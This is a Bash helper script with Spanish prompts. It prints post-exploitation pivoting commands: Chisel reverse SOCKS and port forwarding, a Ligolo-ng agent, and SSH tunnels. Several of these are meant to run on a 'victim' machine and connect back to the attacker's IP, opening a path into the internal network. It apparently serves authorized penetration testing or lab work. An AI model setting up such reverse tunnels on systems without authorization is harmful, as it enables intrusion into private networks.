#!/bin/bash
# portfwd — Helper interactivo para túneles
# Uso: portfwd

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

MY_IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
[ -z "$MY_IP" ] && MY_IP=$(ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

echo -e "${CYAN}${BOLD}portfwd${NC} — Helper de túneles (tu IP: ${GREEN}${MY_IP:-desconocida}${NC})"
echo ""
echo -e "  ${BOLD}1${NC}) Chisel — reverse SOCKS proxy"
echo -e "  ${BOLD}2${NC}) Chisel — port forwarding"
echo -e "  ${BOLD}3${NC}) Ligolo-ng — tunnel completo"
echo -e "  ${BOLD}4${NC}) SSH — local port forwarding"
echo -e "  ${BOLD}5${NC}) SSH — dynamic SOCKS proxy"
echo -e "  ${BOLD}6${NC}) SSH — remote port forwarding"
echo ""
read -p "Opción [1-6]: " OPT

case "$OPT" in
1)
    echo -e "\n${YELLOW}Chisel Reverse SOCKS Proxy${NC}"
    read -p "Puerto del servidor chisel [8888]: " SPORT
    SPORT=${SPORT:-8888}
    echo -e "\n${GREEN}En tu máquina (atacante):${NC}"
    echo -e "  ${CYAN}./chisel server --reverse --port $SPORT${NC}"
    echo -e "\n${GREEN}En la víctima:${NC}"
    echo -e "  ${CYAN}./chisel client $MY_IP:$SPORT R:socks${NC}"
    echo -e "\n${GREEN}Configurar proxychains:${NC}"
    echo -e "  ${CYAN}# /etc/proxychains4.conf → socks5 127.0.0.1 1080${NC}"
    echo -e "\n${GREEN}Usar:${NC}"
    echo -e "  ${CYAN}proxychains nmap -sT -Pn <IP_INTERNA>${NC}"
    ;;
2)
    echo -e "\n${YELLOW}Chisel Port Forwarding${NC}"
    read -p "Puerto del servidor chisel [8888]: " SPORT
    SPORT=${SPORT:-8888}
    read -p "IP interna del target: " TGT_IP
    read -p "Puerto del target: " TGT_PORT
    read -p "Puerto local para acceder [${TGT_PORT}]: " LPORT
    LPORT=${LPORT:-$TGT_PORT}
    echo -e "\n${GREEN}En tu máquina:${NC}"
    echo -e "  ${CYAN}./chisel server --reverse --port $SPORT${NC}"
    echo -e "\n${GREEN}En la víctima:${NC}"
    echo -e "  ${CYAN}./chisel client $MY_IP:$SPORT R:$LPORT:$TGT_IP:$TGT_PORT${NC}"
    echo -e "\n${GREEN}Acceder:${NC}"
    echo -e "  ${CYAN}http://127.0.0.1:$LPORT${NC}  o  ${CYAN}nmap -p$LPORT -sCV 127.0.0.1${NC}"
    ;;
3)
    echo -e "\n${YELLOW}Ligolo-ng Tunnel${NC}"
    read -p "Puerto del proxy [11601]: " SPORT
    SPORT=${SPORT:-11601}
    read -p "Subred interna a alcanzar (ej: 172.16.1.0/24): " SUBNET
    echo -e "\n${GREEN}1. Crear interfaz TUN (una vez):${NC}"
    echo -e "  ${CYAN}sudo ip tuntap add user \$(whoami) mode tun ligolo${NC}"
    echo -e "  ${CYAN}sudo ip link set ligolo up${NC}"
    echo -e "\n${GREEN}2. Iniciar proxy:${NC}"
    echo -e "  ${CYAN}./proxy -selfcert -laddr 0.0.0.0:$SPORT${NC}"
    echo -e "\n${GREEN}3. En la víctima:${NC}"
    echo -e "  ${CYAN}./agent -connect $MY_IP:$SPORT -ignore-cert${NC}"
    echo -e "\n${GREEN}4. En el proxy (cuando conecte):${NC}"
    echo -e "  ${CYAN}session${NC}"
    echo -e "  ${CYAN}start${NC}"
    if [ -n "$SUBNET" ]; then
        echo -e "\n${GREEN}5. Añadir ruta:${NC}"
        echo -e "  ${CYAN}sudo ip route add $SUBNET dev ligolo${NC}"
    fi
    echo -e "\n${GREEN}Ahora puedes acceder directamente a la red interna.${NC}"
    ;;
4)
    echo -e "\n${YELLOW}SSH Local Port Forwarding${NC}"
    read -p "Usuario SSH: " SUSER
    read -p "IP del pivot (máquina con SSH): " PIVOT
    read -p "IP interna del target: " TGT_IP
    read -p "Puerto del target: " TGT_PORT
    read -p "Puerto local [${TGT_PORT}]: " LPORT
    LPORT=${LPORT:-$TGT_PORT}
    echo -e "\n${GREEN}Comando:${NC}"
    echo -e "  ${CYAN}ssh -L $LPORT:$TGT_IP:$TGT_PORT $SUSER@$PIVOT -N${NC}"
    echo -e "\n${GREEN}Acceder:${NC}"
    echo -e "  ${CYAN}http://127.0.0.1:$LPORT${NC}"
    ;;
5)
    echo -e "\n${YELLOW}SSH Dynamic SOCKS Proxy${NC}"
    read -p "Usuario SSH: " SUSER
    read -p "IP del pivot: " PIVOT
    read -p "Puerto SOCKS local [1080]: " SPORT
    SPORT=${SPORT:-1080}
    echo -e "\n${GREEN}Comando:${NC}"
    echo -e "  ${CYAN}ssh -D $SPORT $SUSER@$PIVOT -N${NC}"
    echo -e "\n${GREEN}Configurar proxychains:${NC}"
    echo -e "  ${CYAN}# /etc/proxychains4.conf → socks5 127.0.0.1 $SPORT${NC}"
    echo -e "\n${GREEN}Usar:${NC}"
    echo -e "  ${CYAN}proxychains nmap -sT -Pn <IP_INTERNA>${NC}"
    ;;
6)
    echo -e "\n${YELLOW}SSH Remote Port Forwarding${NC}"
    read -p "Puerto en tu máquina para recibir: " LPORT
    read -p "IP interna del target (desde la víctima): " TGT_IP
    read -p "Puerto del target: " TGT_PORT
    read -p "Tu usuario en tu máquina: " MYUSER
    echo -e "\n${GREEN}Desde la víctima:${NC}"
    echo -e "  ${CYAN}ssh -R $LPORT:$TGT_IP:$TGT_PORT $MYUSER@$MY_IP -N${NC}"
    echo -e "\n${GREEN}Acceder (en tu máquina):${NC}"
    echo -e "  ${CYAN}http://127.0.0.1:$LPORT${NC}"
    ;;
*)
    echo -e "${RED}Opción no válida${NC}"
    exit 1
    ;;
esac

echo ""
